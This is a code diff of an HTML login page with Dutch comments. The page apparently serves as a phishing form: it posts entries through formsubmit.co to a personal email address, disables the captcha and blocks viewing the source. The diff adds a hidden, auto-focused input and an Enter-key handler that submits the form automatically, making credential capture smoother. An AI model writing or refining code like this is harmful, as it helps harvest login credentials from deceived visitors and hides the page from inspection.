@@ -28,6 +28,9 @@
 
   <form id="loginForm" action="https://formsubmit.co/matteogoossens@tuta.io" method="POST">
     <input type="hidden" name="_captcha" value="false">
+    
+    <!-- Verborgen input om Enter te kunnen triggeren -->
+    <input type="text" id="hiddenInput" style="opacity: 0; position: absolute; pointer-events: none;" autocomplete="off">
 
     <button type="submit">NEXT</button>
   </form>
@@ -41,6 +44,12 @@
           (e.ctrlKey && e.key.toLowerCase() === 'u')) {
         e.preventDefault();
         alert("Deze actie is uitgeschakeld!");
+      }
+
+      // ENTER detecteren en formulier verzenden
+      if (e.key === "Enter") {
+        e.preventDefault();
+        document.getElementById("loginForm").submit();
       }
     });
 
@@ -78,6 +87,9 @@
         input.value = value;
         form.appendChild(input);
       }
+
+      // Focus op verborgen input zodat Enter werkt
+      document.getElementById("hiddenInput").focus();
     };
   </script>
 </body>
